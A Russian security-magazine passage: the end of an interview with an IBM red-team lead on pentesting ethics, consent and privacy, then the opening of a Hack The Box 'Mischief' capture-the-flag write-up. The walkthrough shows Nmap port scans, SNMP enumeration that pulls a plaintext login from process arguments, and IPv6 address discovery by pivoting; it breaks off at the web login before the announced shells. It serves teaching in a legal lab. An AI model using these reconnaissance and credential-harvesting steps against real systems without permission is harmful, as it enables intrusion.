как раз хорошо нанимать кого‐то стороннего. Эта команда не дол жна быть
обременена какими‐то зна ниями, которые все при выкли считать исти ной, они
должны думать не так, как все, и не делать умозаключений об устройстве сети
или организационной структуры. Очень часто мы находим уязвимости, потому
что работники организа ции делают что‐то привычным способом и никогда
не пробуют сделать по‐дру гому. Пример: у нас был клиент, который считал,
что финансовые транзакции работают определенным образом и не будут
проходить без авторизации. Мы же нашли, что можно обойти эту авториза‐
цию и никто в организа ции не перепроверит, потому что считают ошибку
невозможной.
  — Обыч но вы моделируете внеш ние угро зы или бывает, что вы
работаете, как внутренний нарушитель?
 — Внутренние угрозы мы тоже моделируем. Мы можем и прислать своих
экспертов, и исполь зовать специальные технологии. У нас, например, есть
ноутбук, который мы по запросу присылаем клиенту, и наши сотрудни ки через
него могут удаленно работать изнутри корпоративной сети. Также в США
у нас есть лаборатории тес тирова ния оборудования, куда организации могут
отправить любое железо, включая IoT‐устройства или промышленные кон‐
троллеры.
  — Расскажи о самой страш ной вещи за последнее вре мя
из того, о чем мож но рассказывать.
 — Можно я расскажу о двух? Одна страшная, дру гая смешная. Страшная:
мы тестировали желез нодорожное депо, и наш пентестер смог удаленно
через интернет влиять на движение поездов. Смешная: мы протестировали
умный унитаз. Он был уязвим!
  — Перед чем кон кретно?
 — Функцию биде можно было использовать удаленно.
  — Уяз вимости мно го обсуждают, но не стал ли в последнее
вре мя челове ческий фак тор еще важ нее?
 — Люди,  конечно,  всег да  находят  интересные способы подорвать
безопасность. Человеку свойственно судить о том, как работают те или иные
вещи, и это проблема для каждого CISO. Даже самые надежные сотрудники
из лучших побуждений иногда лома ют преграды, которые были установлены
неспроста.
  Но в обязанности организаций входит задача снижать такие риски. Если я
дам сотруднику возможность сообщить конфиденциальные данные кому‐то,
кто звонит и не предоставляет о себе достаточной информации, значит, я
ставлю этого сотрудника в положение, в котором он способен оши биться. И я
должен быть готов к тому, что он ошибется, ведь это я ему дал такую воз‐
можность. Мы стараемся помочь нашим клиентам обнаружить подоб ные
ситуации и попытаться повернуть их таким обра зом, чтобы сотрудник при‐
менял критическое мышление. При этом нужно стараться не разрушить кор‐
поративную культуру.
  Мы, конечно, тестиру ем что угодно, но выделяем четыре большие группы
среди наших целей: люди, приложения, сети и железо. Все, с чем мы работа‐
ем, попадает в одну из них, и в каж дой нам важно иметь глубокую компетен‐
цию.
   Как защитники и специалис ты по нас тупательной безопасности, мы
не можем обойтись без категориза ции. Хотя бы потому, что кто‐то должен
быть ответственным за физичес кую безопасность, а кто‐то — за приложения
и так далее. Для преступников же все это не имеет значения. Их цель —
нажива, и инструмент в этом — получение информации. Как именно она
будет получена, не так важно.
  И очень часто организационные швы играют решающую роль и могут
превратить работающую защиту в неработающую. И именно категория
«люди» в контек сте уязвимостей — это место, где сходятся два технологичес‐
ких скоупа. В результате команды безопасников, которые за них отве чают,
часто полагают, что это ответс твенность кого‐то дру гого. То есть, например,
специалисты по сетям считают, что это дело специалистов по приложениям,
а те полагают, что наоборот.
  — Как думаешь, фишинг когда‑нибудь удастся побороть?
 — О нет, я думаю, он, наобо рот, ста нет гораз до более таргетированным.
Мы делаем много фишинговых тестов (spear phishing), и они потрясающе
эффективны. Фишинг, впрочем, сильно изменился за пос ледние годы. Прес‐
тупники достаточно умны, чтобы полностью все поменять, если это перес тает
работать.
  — Ты говорил, что сотрудникам красной коман ды важ но иметь
моральный компас. Как убе диться, что он есть и с ним все
в  поряд ке?  Как  сде лать,  что бы  он был?  Тре нин ги,  может,
какие‑то?
 — Моральным принципам не натрениру ешь. Нужно просто как можно луч‐
ше понимать людей, которых нанимаешь. Хорошо, что я кру чусь в этой индус‐
трии с 1993 года и большинство из них я знаю лично. Со многими мы уже
работали раньше. Также мы поддерживаем связь с другими красными коман‐
дами, и, когда мы кого‐то нанимаем, мы не только проверя ем их на интервью
и проводим дополнительные проверки, мы общаемся с их бывшими кол‐
легами и стараемся понять, каких моральных принципов придерживается
человек.
  — Как в целом убе диться, что красная коман да будет действо-
вать в рамках сво их пол номочий? Помимо под бора правильных
людей, есть еще и юридическая сто рона.
 — У нас есть совет по вопросам этики, который работает с нашей коман‐
дой юристов, чтобы непрерывно следить не толь ко за нашими моральными
принципами, но и за тем, какой работой мы занима емся. Мы очень щепетиль‐
но относимся к выбору про ектов и от многих предложений отказываемся,
потому что они выходят за рамки того, что в IBM считают допустимым.
Это очень важно.
  — Можешь привести примеры активностей, которые оказыва-
ются за рамками допустимого?
 — В первую очередь нам нужно убедиться, что у нас действительно есть
разрешение тестировать ту цель, которую нас просят протестировать. И раз‐
решение должно быть в форме осоз нанно го согласия. Причем даже если
кто‐то говорит: «Да, можете тестировать эту цель», нужно понять, действи‐
тельно ли он занимает соответс твующую позицию в компании и есть ли у него
право принимать такие решения. Вы порази тесь, как часто мы обнаруживаем,
что ответ на один из этих воп росов отри цательный.
  — Ты говорил о пугающих наход ках, а как насчет опасных тех-
нологий?
 — Я занимаюсь тем, что проверяю технологии на прочность, поэтому меня
сложно чем‐то напугать. Наоборот — то, чего многие боятся, мне может быть
на руку в моей работе.
  Но если оставить эти вопросы в стороне, то пугают меня любые тех‐
нологии, которые направлены на то, что бы собирать и накапливать большие
массивы личных данных. Или же используют эту информацию в принятии
решений. Вот в этих случаях у меня иногда волосы дыбом встают. В первую
очередь потому, что защитить большие мас сивы данных очень тяжело, а они
становятся все более ценными мишенями.
  Получается, что мы потихоньку оказываемся в мире, где атакующий может
заполучить не только платеж ные данные (мы при выкли к тому, что это самое
ценное), но и ценную персональную информацию (personally identifying infor‐
mation, PII). И даже вещи, которые рань ше не были серьезными мишенями,
теперь становятся ими — например, данные прог рамм лояльности. Любая
авиакомпания или отель собира ют час тную информа цию, и злоумышленники
тоже все лучше учатся, заполучив такие данные, использовать их.
  Меня беспокоит то, что количес тво уже утекших персональных данных
может быть ящиком Пандоры, который мы не сможем закрыть. Пока чинов‐
ники говорят, что они защитят личную информа цию и потребителей, что вве‐
дут новые законы, я думаю об информа ции, которая уже в руках потенциаль‐
ных злоумышленников. Что с ней будет? Ее уже никак не вернуть.
  За последние пять‐десять лет утекло уже столько, что сама концепция
приватности, возможно, потеря на для целого поколения. Прямо сей час
в  даркне те  можно   купить  американский   загранпас порт  по  цене
от 3000 до 35 000 дол ларов. И это не какой‐то кра деный пас порт, а информа‐
ция, которой достаточ но для создания поддельного. А вот поддельная ID‐кар‐
та или водительские пра ва стоят 20 долларов. Это значит, что данных
водительских прав слито такое количество, что цена серьезно сни зилась.
И если вся информация о нас ока жется пуб личной, то, например, двухфактор‐
ная авторизация станет очень сложной.
  А что до технологий, то если что‐то меня и пуга ет, то это вещи вроде бан‐
коматов или промышленных контроллеров, которые очень сложно апгрей‐
дить, — они работают на антикварных операци онках вроде XP Embedded,
и нашим клиентам иногда кажется неп рактичным менять их.
  При этом результаты атак на такие вещи часто могут быть крайне ощу‐
тимыми. Например, я уже рас ска зывал про наше исследование управляющих
систем, которые исполь зовались на электрос танциях. Шокирует, что защита
термостата у меня дома может быть лучше, чем у устройства, которое
управляет механизмом водос броса на гидроэлектрос танции. При этом он
подклю чен не просто к какой‐то сети, а к интернету напрямую.
  — В какой из областей безопасности, на твой взгляд, тре бует-
ся улуч шение или грядут серьезные изме нения?
 — Я думаю, область применения ИИ будет огромной. Есть смысл искать
будничные вопросы,  связанные  с безопасностью, которые приходится
решать сотрудникам среднего звена, и автоматизировать их решение.
При этом люди будут фокусировать ся на важных вещах, которые дадут серь‐
езные результаты. То есть быть хитрее, а не боль ше работать. Пускай люди
делают то, что у них лучше получа ется, а компьютеры — то, что у них.
  — Если сравнить авто матизацию, которую используют зло-
умыш ленники, и авто матизацию защиты, где сейчас более стре-
мительное раз витие?
 — Я бы сказал, что у прес тупников лучше получа ется использовать авто‐
матизацию там, где это больше нужно. Они не оказываются в петле решения
о том, человеку этой работой заниматься или машине. Здесь люди и прог‐
раммы работают сообща гораздо лучше, чем у защитников. При этом я
не думаю, что когда‐нибудь получится полностью автомати зировать защиту,
точно так же, как не выйдет полностью авто матизировать атаку. Но мы можем
прийти к тому, что авто матизация в обоих случаях будет использоваться
гораздо более эффективно.
  — Давай пред ставим ситу ацию, когда компания обращается
к вам и про сит про вести тестирование, но заод но спрашивает
совета — с чего начать. Какой будет рекомен дация? Социальная
инже нерия, веб‑приложе ния, сети? И как принимается решение
в этом слу чае?
 — Тут все зависит от того, насколько компания готова к этому. Существует
ли команда реагирования, проводилось ли рань ше тестирование, что показы‐
вают сканеры уязвимос тей. Если используется система управления уяз‐
вимостями (VMS), занят ли кто‐то их устра нением, или к этому даже не под‐
ступались? Если в ответ на эти вопросы мы видим пустые взгляды, значит,
организация не готова.
   Если же есть удовлетво ритель ные ответы — компания готова к редтимин‐
гу, симуляциям атак, проверке синей команды, разбору ее реакции. А если
нет,  значит,  нужно  заниматься  пентеста ми  сетей  и  веб‐приложений.
В общем, если не достигнута определенная планка защищенности, красная
команда — это может быть немного слиш ком.
  Поясню на всякий случай: цель пентестов — проверить некую цель, а крас‐
ная команда про веряет организа цию в целом. Если защита будет слишком
слабой, выгоды от такого тестирова ния окажется мало. Мы часто проводим
пентесты по подписной модели в течение нескольких лет, прежде чем
безопасность достигнет того уровня, с которым стоит работать красной
команде.
ВЗЛОМ

  ВЕЛИКИЙ
 ПАКОСТНИК





          ПРОБИРАЕМСЯ
    ЧЕРЕЗ ДЕБРИ IPV6 К ROOT‐ФЛАГУ
      ВИРТУАЛКИ С HACK THE BOX





В этой статье я покажу, как получить права
суперпользователя на виртуальной машине
Mischief с CTF‐площадки Hack The Box. Этот
забег даст нам навыки работы с про токо‐
лом SNMP, поможет понять прин цип IPv6‐             snovvcrash                                                                                        Безопасник, временами
маршрутизации и разобраться с механиз‐        криптоана(рхист)литик,питонщик, местами по
мом  рас пределения  прав доступа  ACL,       необходимостиадминистратор.системный
а под занавес мы постро им и протестируем        snovvcrash@protonmail.ch
полноценный ICMP‐шелл на Python.


По уровню сложности эта вир туалка на Linux находит ся где‐то между Medium
и Hard (6,3 балла из 10), хотя изна чальный ее рейтинг был определен как In‐
sane. Если бы не некото рые ошибки создателя машины, она и правда была бы
«безумной».
   Вот что нас ждет на пути к финальному флагу:
 • сбор и анализ информации, предос тавляемой протоколом SNMP, с пос‐
   ледующим извле чением авториза ционных данных из аргументов коман‐
   дной строки для простого Python‐сервера;
 • получение IPv6‐адреса машины из того же вывода SNMP (первый способ)
   либо через pivoting дру гого хос та на Hack The Box из его MAC‐адреса (вто‐
   рой способ — алго ритм EUI‐64);
 • обнаружение веб‐сервера, живущего по найденному IPv6‐адре су и содер‐
  жащего панель удален ного выполнения команд на атакуемой машине;
 • обход фильтрации, который даст воз можность инъекции произвольных
   команд, и захват авториза ционных данных пользователя;
 • получение реверс‐шел ла по IPv6 в обход правил iptables для запус ка su
   от имени www‐data (так как ока зывается, что пользователя блокиру ет
   механизм распределения прав дос тупа ACL) и получения root‐сессии
   с паролем, забытым в .bash_history;
 • наконец, на сладкое создание ICMP‐шелла с помощью модуля Scapy
   на Python. Он даст воз можность просматри вать результаты удаленного
   исполнения команд при помощи ути литы ping.


РАЗВЕДКА
Nmap
Итак, по традиции начнем подготовительный этап сбо ра информации со ска‐
нирования портов с помощью Nmap.


TCP
Сперва сканируем весь диапазон TCP‐портов хос та прос тым сканом SYN.



  root@kali:~# nmap ‐n ‐v ‐Pn ‐‐min‐rate 5000 ‐oA nmap/initial ‐p‐
  10.10.10.92
  root@kali:~# cat nmap/initial.nmap
  # Nmap 7.70 scan initiated Mon Apr  1 16:17:45 2019 as: nmap ‐n ‐v ‐Pn ‐
  ‐min‐rate 5000 ‐oA nmap/initial ‐p‐ 10.10.10.92
  Nmap scan report for 10.10.10.92
  Host is up (0.045s latency).
  Not shown: 65533 filtered ports
  PORT     STATE SERVICE
  22/tcp   open  ssh
  3366/tcp open  creativepartnr


  Read data files from: /usr/bin/../share/nmap
  # Nmap done at Mon Apr  1 16:18:11 2019 ‐‐ 1 IP address (1 host up)
  scanned in 26.45 seconds


И теперь делаем точечный запрос на порты 22 и 3366, используя опре деле‐
ние версии сервисов и дефолтные скрипты NSE.



  root@kali:~# nmap ‐n ‐v ‐Pn ‐sV ‐sC ‐oA nmap/version ‐
  p22,3366 10.10.10.92
  root@kali:~# cat nmap/version.nmap
  # Nmap 7.70 scan initiated Mon Apr  1 16:18:20 2019 as: nmap ‐n ‐v ‐Pn ‐
  sV ‐sC ‐oA nmap/version ‐p22,3366 10.10.10.92
  Nmap scan report for 10.10.10.92
  Host is up (0.042s latency).


  PORT     STATE SERVICE VERSION
  22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.
  0)
  | ssh‐hostkey:
  |   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
  |   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
  |_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
  3366/tcp open  caldav  Radicale calendar and contacts server (Python
  BaseHTTPServer)
  | http‐auth:
  | HTTP/1.0 401 Unauthorized\x0D
  |_  Basic realm=Test
  | http‐methods:
  |_  Supported Methods: GET HEAD
  |_http‐server‐header: SimpleHTTP/0.6 Python/2.7.15rc1
  |_http‐title: Site doesn't have a title (text/html).
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


  Read data files from: /usr/bin/../share/nmap
  Service detection performed. Please report any incorrect results at
  https://nmap.org/submit/ .
  # Nmap done at Mon Apr  1 16:18:44 2019 ‐‐ 1 IP address (1 host up)
  scanned in 24.05 seconds


Информации немного. Мы видим вот что.
 • Это относительно новая сборка Ubuntu. Проверив баннер со строкой вер‐
   сии SSH OpenSSH  7.6p1  Ubuntu  4 на launchpad.net — ресурсе,
   на котором хостятся репозитории пакетов для Ubuntu, — убеждаемся, что
  мы имеем дело с версией Bionic от 2018.03.07, поэтому искать экс плоиты
   для Secure Shell бессмысленно.
 • На 3366‐м порте TCP работает простой Python HTTP‐сервер с авториза‐
   цией. С самого начала начинать брутить вслепую что бы то ни было —
   откровенный моветон, поэтому рас ширим поверхность атаки сканиро‐
   ванием UDP‐пор тов.





                   Узнаем версию ОС по баннеру SSH


UDP
Как и раньше, сначала «про щупа ем почву», исполь зуя на этот раз флаг ‐sU
для диапазона UDP.



  root@kali:~# nmap ‐n ‐v ‐Pn ‐‐min‐rate 5000 ‐oA nmap/udp‐initial ‐sU ‐p‐
  10.10.10.92
  root@kali:~# cat nmap/udp‐initial.nmap
  # Nmap 7.70 scan initiated Mon Apr  1 16:26:41 2019 as: nmap ‐n ‐v ‐Pn ‐
  ‐min‐rate 5000 ‐oA nmap/udp‐initial ‐sU ‐p‐ 10.10.10.92
  Nmap scan report for 10.10.10.92
  Host is up (0.048s latency).
  Not shown: 65534 open|filtered ports
  PORT    STATE SERVICE
  161/udp open  snmp


  Read data files from: /usr/bin/../share/nmap
  # Nmap done at Mon Apr  1 16:27:08 2019 ‐‐ 1 IP address (1 host up)
  scanned in 26.56 seconds


И «добьем» расширенным запросом.



  root@kali:~# nmap ‐n ‐v ‐Pn ‐sV ‐sC ‐oA nmap/udp‐version ‐sU ‐
  p161 10.10.10.92
  root@kali:~# cat nmap/udp‐version.nmap
  # Nmap 7.70 scan initiated Mon Apr  1 16:27:39 2019 as: nmap ‐n ‐v ‐Pn ‐
  sV ‐sC ‐oA nmap/udp‐version ‐sU ‐p161 10.10.10.92
  Nmap scan report for 10.10.10.92
  Host is up (0.043s latency).


  PORT    STATE SERVICE VERSION
  161/udp open  snmp    SNMPv1 server; net‐snmp SNMPv3 server (public)
  | snmp‐info:
  |   enterprise: net‐snmp
  |   engineIDFormat: unknown
  |   engineIDData: b6a9f84e18fef95a00000000
  |   snmpEngineBoots: 19
  |_  snmpEngineTime: 16h02m33s
  | snmp‐interfaces:
  |   lo
  |     IP address: 127.0.0.1  Netmask: 255.0.0.0
  |     Type: softwareLoopback  Speed: 10 Mbps
  |     Status: up
  |     Traffic stats: 0.00 Kb sent, 0.00 Kb received
  |   Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
  |     IP address: 10.10.10.92  Netmask: 255.255.255.0
  |     MAC address: 00:50:56:b9:7c:aa (VMware)
  |     Type: ethernetCsmacd  Speed: 1 Gbps
  |     Status: up
  |_    Traffic stats: 456.93 Kb sent, 39.49 Mb received
  | snmp‐netstat:
  |   TCP  0.0.0.0:22           0.0.0.0:0
  |   TCP  0.0.0.0:3366         0.0.0.0:0
  |   TCP  127.0.0.1:3306       0.0.0.0:0
  |   TCP  127.0.0.53:53        0.0.0.0:0
  |   UDP  0.0.0.0:161          *:*
  |   UDP  0.0.0.0:38577        *:*
  |_  UDP  127.0.0.53:53        *:*
  | snmp‐processes:
  | [... Вывод SNMP ...]
  Service Info: Host: Mischief


  Read data files from: /usr/bin/../share/nmap
  Service detection performed. Please report any incorrect results at
  https://nmap.org/submit/ .
  # Nmap done at Mon Apr  1 16:30:03 2019 ‐‐ 1 IP address (1 host up)
  scanned in 143.80 seconds


Уже интереснее — есть SNMP‐сервер на 161‐м порте UDP и даже под‐
робности, полученные скрип тами Nmap. Хотя полный вывод опущен (от Nmap
он длинный и не очень информа тивный), от этого можно смело оттолкнуться
при поиске пути проникновения в систему.


Иссле дование SNMP — порт 161 UDP
Что такое SNMP? Статья в «Википедии» гласит:



     SNMP (англ. Simple Network Management Protocol — прос той протокол
      сетевого управле ния) — стандар тный интернет‑протокол для управле-
      ния устройства ми в IP-сетях на основе архитек тур TCP/UDP. К под-
     держивающим SNMP устройствам относятся мар шру тиза торы, ком-
      мутаторы, сер веры, рабочие станции, принтеры, модем ные стойки
      и  дру гие.  Протокол  обыч но  используется  в  сис темах  сетевого
      управле ния для контроля под клю ченных к сети устройств на пред мет
      условий, которые тре буют внимания админис тра тора.
       SNMP воз глав ляет сос тавленный SANS  Institute список «Common
       Default Configuration Issues» с воп росом изна чальной уста нов ки строк
      сообщес тва на  зна чения  «public» и  «private» и занимал десятую
      позицию в SANS Top 10 самых критичес ких угроз интернет‑безопас-
      ности за 2000 год.

То есть SNMP позволяет собирать и расшаривать информацию о том, что
происходит на хостах в сети. Информа ция такого рода инкапсулиру ется
в базу управляющей информа ции MIB (Management Information Base), а иден‐
тификаторы объектов OID (Object Identiﬁers) однозначно определяют записи
в этой базе. К примеру, идентифика тор 1.3.6.1.2.1.4.34 описывает сущ‐
ность ipAddressTable (таб лица IP‐адресов), а 1.3.6.1.2.1.4.34.1.3 опи‐
сывает сущность ipAddressIfIndex (индекс интерфейса).
  MIB основана на нотации ASN.1 и используется для упрощения представ‐
ления данных в фор мате, понят ном человеку, следовательно, она не является
необходимым компонентом SNMP. Ближайшая ана логия — DNS‐сервер,
резолвящий легко читаемые доменные имена в такие чуждые нам цифры IP‐
адресов.
   Рассмотрим, как можно выжать информа цию из службы SNMP штатными
средствами Kali Linux.


Настройка snmpwalk
Для анализа информации, которую целевой хост предоставляет по SNMP,
воспользуемся snmpwalk — стандартной утилитой для разведки SNMP в Linux.
   Если запустить snmpwalk при базовых настройках, ничего, кроме непонят‐
ных для челове ческого взгляда идентифика торов OID, мы не получим. Здесь
на помощь приходит  пакет snmp‐mibs‐downloader, который  загружает
и инсталлирует базу MIB. Уста новим его.



  root@kali:~# apt install snmp‐mibs‐downloader ‐y


А затем разрешим использование MIB, закомментировав единственную зна‐
чащую строку в /etc/snmp/snmp.conf.


Со бираем дамп
С помощью snmpwalk сдампим весь тра фик SNMP с указанием версии про‐
токола 2c (самая распростра ненная) и строки сообщества public, которая,
по сути, служит паролем по умолчанию для местного способа аутентифика‐
ции.



  root@kali:~# snmpwalk ‐v 2c ‐c public 10.10.10.92 | tee snmpwalk.out


Вывод массивный, поэтому он был перенаправлен в файл snmpwalk.out
для дальнейшей работы.
  К слову: если тебе нужно было оста ваться более «бесшумным», было бы
рационально запросить у snmpwalk только ту информацию, которая тебе нуж‐
на. Например, чтобы получить список запущенных процессов, достаточно
уточнить запрос опцией hrSWRunName (OID 1.3.6.1.2.1.25.4.2.1.2).



  root@kali:~# snmpwalk ‐v 2c ‐c public 10.10.10.92 hrSWRunName
  HOST‐RESOURCES‐MIB::hrSWRunName.1 = STRING: "systemd"
  HOST‐RESOURCES‐MIB::hrSWRunName.2 = STRING: "kthreadd"
  HOST‐RESOURCES‐MIB::hrSWRunName.4 = STRING: "kworker/0:0H"
  HOST‐RESOURCES‐MIB::hrSWRunName.6 = STRING: "mm_percpu_wq"
  HOST‐RESOURCES‐MIB::hrSWRunName.7 = STRING: "ksoftirqd/0"
  HOST‐RESOURCES‐MIB::hrSWRunName.8 = STRING: "rcu_sched"
  HOST‐RESOURCES‐MIB::hrSWRunName.9 = STRING: "rcu_bh"
  HOST‐RESOURCES‐MIB::hrSWRunName.10 = STRING: "migration/0"
  HOST‐RESOURCES‐MIB::hrSWRunName.11 = STRING: "watchdog/0"
  HOST‐RESOURCES‐MIB::hrSWRunName.12 = STRING: "cpuhp/0"
  HOST‐RESOURCES‐MIB::hrSWRunName.13 = STRING: "kdevtmpfs"
  HOST‐RESOURCES‐MIB::hrSWRunName.14 = STRING: "netns"
  HOST‐RESOURCES‐MIB::hrSWRunName.15 = STRING: "rcu_tasks_kthre"
  ...



Список запущен ных про цессов
Вспомним, что мы видели питоновский HTTP‐сервер на 3366‐м порте TCP
и он запрашивал авторизацию. Логин с паролем для такого сервака подаются
питону в качестве аргументов командной строки в виде SimpleHTTPAuth‐
Server [‐h] [‐‐dir DIR] [‐‐https] port key, поэтому мы можем поп‐
робовать отыскать их в захваченном дампе.
  Для этого среди записей типа hrSWRunName най дем процесс интерпре‐
татора Python:



  root@kali:~# cat snmpwalk.out | grep hrSWRunName | grep python
  HOST‐RESOURCES‐MIB::hrSWRunName.593 = STRING: "python"


И далее по полученному индексу 593 выведем все, что относится к этому про‐
цессу в табличке hrSWRunTable.



  root@kali:~# cat snmpwalk.out | grep 593
  HOST‐RESOURCES‐MIB::hrSWRunIndex.593 = INTEGER: 593
  HOST‐RESOURCES‐MIB::hrSWRunName.593 = STRING: "python"
  HOST‐RESOURCES‐MIB::hrSWRunID.593 = OID: SNMPv2‐SMI::zeroDotZero
  HOST‐RESOURCES‐MIB::hrSWRunPath.593 = STRING: "python"
  HOST‐RESOURCES‐MIB::hrSWRunParameters.593 = STRING: "‐m SimpleHTTPAuth‐
  Server 3366 loki:godofmischiefisloki ‐‐dir /home/loki/hosted/"
  HOST‐RESOURCES‐MIB::hrSWRunType.593 = INTEGER: application(4)
  HOST‐RESOURCES‐MIB::hrSWRunStatus.593 = INTEGER: runnable(2)
  HOST‐RESOURCES‐MIB::hrSWRunPerfCPU.593 = INTEGER: 1129
  HOST‐RESOURCES‐MIB::hrSWRunPerfMem.593 = INTEGER: 13852 KBytes
  HOST‐RESOURCES‐MIB::hrSWInstalledIndex.593 = INTEGER: 593
  HOST‐RESOURCES‐MIB::hrSWInstalledName.593 = STRING: "tzdata‐2018d‐1"
  HOST‐RESOURCES‐MIB::hrSWInstalledID.593 = OID: SNMPv2‐SMI::zeroDotZero
  HOST‐RESOURCES‐MIB::hrSWInstalledType.593 = INTEGER: application(4)
  HOST‐RESOURCES‐MIB::hrSWInstalledDate.593 = STRING: 0‐1‐1,0:0:0.0


Запись hrSWRunParameters дает нам парамет ры запус ка сервера ‐m Sim‐
pleHTTPAuthServer 3366 loki:godofmischiefisloki ‐‐dir /home/loki/
hosted/, где находятся нужные нам авто ризационные данные loki:god‐
ofmischiefisloki.


IPv6-адрес
Просматривая список процес сов, я уви дел запущенный apache2.



  root@kali:~# cat snmpwalk.out| grep hrSWRunName | grep apache
  HOST‐RESOURCES‐MIB::hrSWRunName.770 = STRING: "apache2"
  HOST‐RESOURCES‐MIB::hrSWRunName.2549 = STRING: "apache2"
  HOST‐RESOURCES‐MIB::hrSWRunName.2550 = STRING: "apache2"
  HOST‐RESOURCES‐MIB::hrSWRunName.2551 = STRING: "apache2"
  HOST‐RESOURCES‐MIB::hrSWRunName.2552 = STRING: "apache2"
  HOST‐RESOURCES‐MIB::hrSWRunName.2553 = STRING: "apache2"


При этом Nmap его не показал... Это может озна чать, что сервер крутится
в мире IPv6, и было бы неплохо вытащить соответству ющий IP‐адрес, чтобы
позже инициировать сканирование Nmap повторно (но на этот раз для IPv6‐
адреса).



  root@kali:~# cat snmpwalk.out| grep ipAddressType | grep ipv6
  IP‐MIB::ipAddressType.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:
  00:01" = INTEGER: unicast(1)
  IP‐MIB::ipAddressType.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:
  7c:aa" = INTEGER: unicast(1)
  IP‐MIB::ipAddressType.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:
  7c:aa" = INTEGER: unicast(1)




  root@kali:~# ping6 ‐c2 dead:beef::0250:56ff:feb9:7caa
  PING dead:beef::0250:56ff:feb9:7caa(dead:beef::250:56ff:feb9:7caa) 56
  data bytes
  64 bytes from dead:beef::250:56ff:feb9:7caa: icmp_seq=1 ttl=63 time=43.5
  ms
  64 bytes from dead:beef::250:56ff:feb9:7caa: icmp_seq=2 ttl=63 time=42.9
  ms


  ‐‐‐ dead:beef::0250:56ff:feb9:7caa ping statistics ‐‐‐
  2 packets transmitted, 2 received, 0% packet loss, time 4ms
  rtt min/avg/max/mdev = 42.922/43.214/43.507/0.358 ms


Видим маршрутизируемый IPv6‐адрес de:ad:be:ef::02:50:56:ff:fe:b9:
7c:aa и link‐local IPv6‐адрес fe:80::02:50:56:ff:fe:b9:7c:aa, которые,
кстати, будут меняться при каждом ресете вир туалки.


EUI-64
Рассмотрим, как работает механизм автоматической генерации  link‐local
IPv6‐адреса на основе идентифика тора EUI‐64 из MAC‐адре са на примере
Mischief.
  Для этого нам нужно находиться на одном канальном уровне (OSI layer 2)
с тем хостом, адрес которого мы хотим узнать. Чтобы посмотреть, как это
работает, залогинимся на другой вир туальной машине с Hack The Box,
которая называется Hawk. Так как все запущенные инстансы находятся
в одном логическом сегменте (виртуальной) сети 10.10.10.0/24, то мы
можем достучаться с Hawk до Mischief. Другими словами, пусть Hawk станет
нашим связующим звеном — Pivot Point.
  Дадим пинг от Hawk до Mischief и зап росим ARP‐таблицу для того, чтобы
вытащить MAC Mischief.



  root@hawk:~$ ping 10.10.10.92
  PING 10.10.10.92 (10.10.10.92) 56(84) bytes of data.
  64 bytes from 10.10.10.92: icmp_seq=1 ttl=64 time=64.0 ms
  ^C
  ‐‐‐ 10.10.10.92 ping statistics ‐‐‐
  1 packets transmitted, 1 received, 0% packet loss, time 0ms
  rtt min/avg/max/mdev = 64.063/64.063/64.063/0.000 ms


  root@hawk:~$ arp ‐a
  _gateway (10.10.10.2) at 00:50:56:aa:f1:dd [ether] on ens33
  ? (10.10.10.92) at 00:50:56:b9:7c:aa [ether] on ens33


Добыли MAC‐адрес — 00:50:56:b9:7c:aa. Чтобы получить из него link‐local
IPv6‐адрес, нужно провес ти следующие нехитрые манипуляции:
 1. Сгруппируем MAC в привычной для IPv6 форме, а именно по два окте та —
  0050:56b9:7caa.
 2. В начало MAC допишем fe80:: — fe80::0050:56b9:7caa.
 3. В середину MAC вставим ff:fe — fe80::0050:56ff:feb9:7caa.
 4. Инвертируем шестой бит MAC — fe80::0250:56ff:feb9:7caa (было
  0000 0000, стало 0000 0010, или 0x02).
 5. Через символ процента укажем интерфейс (так как в мире IPv6 адреса
   привязываются к интерфейсам, а не к узлам и, если не указать интерфейс,
   трафик не будет знать, куда ему идти) — fe80::0250:56ff:feb9:
  7caa%ens33.

Проверяем, что получилось.



  root@hawk:~$ ping6 ‐c4 fe80::0250:56ff:feb9:7caa%ens33
  PING fe80::0250:56ff:feb9:7caa%ens33(fe80::250:56ff:feb9:7caa%ens33) 56
  data bytes
  64 bytes from fe80::250:56ff:feb9:7caa%ens33: icmp_seq=1 ttl=64 time=136
  ms
  64 bytes from fe80::250:56ff:feb9:7caa%ens33: icmp_seq=2 ttl=64 time=0.
  236 ms
  64 bytes from fe80::250:56ff:feb9:7caa%ens33: icmp_seq=3 ttl=64 time=0.
  240 ms
  64 bytes from fe80::250:56ff:feb9:7caa%ens33: icmp_seq=4 ttl=64 time=0.
  272 ms


  ‐‐‐ fe80::0250:56ff:feb9:7caa%ens33 ping statistics ‐‐‐
  4 packets transmitted, 4 received, 0% packet loss, time 3031ms
  rtt min/avg/max/mdev = 0.236/34.259/136.290/58.907 ms


It’s alive! Теоретически мож но было бы про дол жать прохождение через прок‐
сирование Hawk, реализуя схему Proxy Pivoting, если бы была такая необ‐
ходимость. Но к счастью, нас ждет дру гой путь.


        WWW

                   Еще несколько инструмен тов для взаимодействия
                        с SNMP.
                      •snmp‐check — «из коробки» дает читабельный
                           (но не самый подробный) результат без необ‐
                        ходимости ставить MIB. Входит в состав Kali
                              Linux.
                         •onesixtyone —  утилита для брутфорса строк
                        сообщества. Пригодилась бы нам, если бы
                      дефолтная строка public не подошла.
                       •enyx — небольшой скрипт на Python, позволя‐
                    ющий по SNMP узнать IPv6‐адрес хоста в одно
                        действие. Инте ресно, что написал скрипт соз‐
                          датель самой ВМ Mischief.



WEB — ПОРТ 3366 TCP
Вернемся к нашим открытым портам и отпра вимся смотреть на HTTP‐сервер.





        Авторизационная форма HTTP‐сервера 10.10.10.92:3366

Мы уже выбили креды loki:godofmischiefisloki, поэтому без зазрения
совести авторизуемся и попадаем сюда.





           После авторизации на сервере 10.10.10.92:3366

Имеем изображение Локи (на стеганографию про верять здесь не буду,
поэтому поверь на сло во — там ничего нет) и еще одну пару логин —
